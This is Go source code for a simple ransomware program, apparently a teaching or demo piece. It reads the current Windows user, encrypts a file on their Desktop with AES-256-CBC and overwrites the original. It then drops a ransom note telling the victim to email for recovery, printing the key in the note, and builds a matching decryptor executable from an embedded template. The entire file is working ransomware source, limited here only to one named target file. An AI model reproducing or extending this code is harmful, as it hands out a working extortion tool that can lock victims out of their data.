package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"text/template"
)

const AESKeyLength = 32 // 256-bit
const BlockSize = aes.BlockSize

func generateKey() ([]byte, error) {
	key := make([]byte, AESKeyLength)
	_, err := rand.Read(key)
	return key, err
}

func padPKCS7(data []byte) []byte {
	padding := BlockSize - (len(data) % BlockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

func generateDecryptor(key []byte, currentUser string) error {

	fmt.Println("[*] Generating decryptor...")

	const decryptorTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"os"
)

const BlockSize = aes.BlockSize

var keyHex = "{{.KeyHex}}"

func UnpadPKCS7(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, fmt.Errorf("Invalid padding size")
	}
	paddingLen := int(data[length-1])
	if paddingLen > BlockSize || paddingLen == 0 {
		return nil, fmt.Errorf("Invalid padding")
	}
	return data[:length-paddingLen], nil
}

func DecryptFile(path string, key []byte) error {
	fmt.Println("[*] Decrypting file:", path)

	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("[-] Failed to read file: %w", err)
	}

	if len(data) < BlockSize {
		return fmt.Errorf("[-] File too small to decrypt")
	}

	iv := data[:BlockSize]
	ciphertext := data[BlockSize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("[-] Failed to create cipher: %w", err)
	}

	if len(ciphertext)%BlockSize != 0 {
		return fmt.Errorf("[-] Ciphertext is not a multiple of block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	unpadded, err := UnpadPKCS7(plaintext)
	if err != nil {
		return fmt.Errorf("[-] Failed to unpad decrypted data: %w", err)
	}

	err = os.WriteFile(path, unpadded, 0644)
	if err != nil {
		return fmt.Errorf("[-] Failed to write decrypted file: %w", err)
	}

	fmt.Println("[+] Decryption complete.")
	return nil
}

func main() {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		fmt.Println("[-] Failed to decode key:", err)
		return
	}

	filePath := fmt.Sprintf("C:\\Users\\{{.User}}\\Desktop\\dont_hurt_me.victim")
	
	err = DecryptFile(filePath, key)
	if err != nil {
		fmt.Println(err)
	}
}
`
	// Deals with the template
	decryptDir := "cmd/decrypt"
	err := os.MkdirAll(decryptDir, 0755)
	if err != nil {
		return fmt.Errorf("[-] Failed to create decrypt directory: %w", err)
	}

	tmpl, err := template.New("decryptor").Parse(decryptorTemplate)
	if err != nil {
		return fmt.Errorf("[-] Failed to parse template: %w", err)
	}

	decryptorPath := filepath.Join(decryptDir, "main.go")
	file, err := os.Create(decryptorPath)
	if err != nil {
		return fmt.Errorf("failed to create decryptor file: %w", err)
	}
	defer file.Close()

	data := struct {
		KeyHex string
		User string
	}{
		KeyHex: fmt.Sprintf("%x", key),
		User: currentUser,
	}

	err = tmpl.Execute(file, data)
	if err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	// Building executable
	cmd := exec.Command("go", "build", "-o", fmt.Sprintf("C:\\Users\\%s\\Desktop\\decryptor.exe", currentUser), decryptorPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to build decryptor: %w\nOutput: %s", err, output)
	}

	fmt.Println("[+] Decryptor generated successfully")
	return nil
}

func encryptFile(path string, key []byte) error {
	fmt.Println("[*] Encrypting file:", path)

	// Open and read the file
	input, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("[-] Failed to read file: %w", err)
	}

	// Pad data
	padded := padPKCS7(input)

	// Generate random IV
	iv := make([]byte, BlockSize)
	if _, err := rand.Read(iv); err != nil {
		return fmt.Errorf("[-] Failed to generate IV: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("[-] Failed to create cipher: %w", err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	ciphertext := make([]byte, len(padded))
	mode.CryptBlocks(ciphertext, padded)

	// Prepend IV and overwrite file
	output := append(iv, ciphertext...)
	if err := os.WriteFile(path, output, 0644); err != nil {
		return fmt.Errorf("[-] Failed to write encrypted file: %w", err)
	}

	fmt.Println("[+] File encrypted successfully.")
	return nil
}

func getUser() string {
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("[-] Failed to get current user:", err)
		return ""
	}

	username := strings.Split(currentUser.Username, "\\")

	return username[1]
}

func main() {
	key, err := generateKey()
	if err != nil {
		fmt.Println("[-] Key generation failed:", err)
		return
	}

	currentUser := getUser()
	// fmt.Printf("[+] Current user: %s\n", user)
	fmt.Println("[+] Current user:", currentUser)

	filePath := fmt.Sprintf("C:\\Users\\%s\\Desktop\\dont_hurt_me.victim", currentUser)

	err = encryptFile(filePath, key)
	if err != nil {
		fmt.Println(err)
		return
	}

	notePath := fmt.Sprintf("C:\\Users\\%s\\Desktop\\note.txt", currentUser)
	noteContent := fmt.Sprintf(`All of your victim files have been encrypted.
To unlock them contact me with your encryption code in this email@email.com,
your encryption code is: %x`, key)

	file, err := os.Create(notePath)
	if err != nil {
		fmt.Println("[-] Failed to create note.txt:", err)
		return
	}
	l, err := file.WriteString(noteContent)

	if err != nil {
		fmt.Println(err)
		return
	} else {
		fmt.Println(l, "bytes written to", notePath)
	}
	defer file.Close()

	err = generateDecryptor(key, currentUser)

	if err != nil {
		fmt.Println("[-] Failed to generate decryptor:", err)
	} else {
		fmt.Println("[+] Decryptor generated successfully.")
	}

	fmt.Printf("[+] Encryption complete.")
}
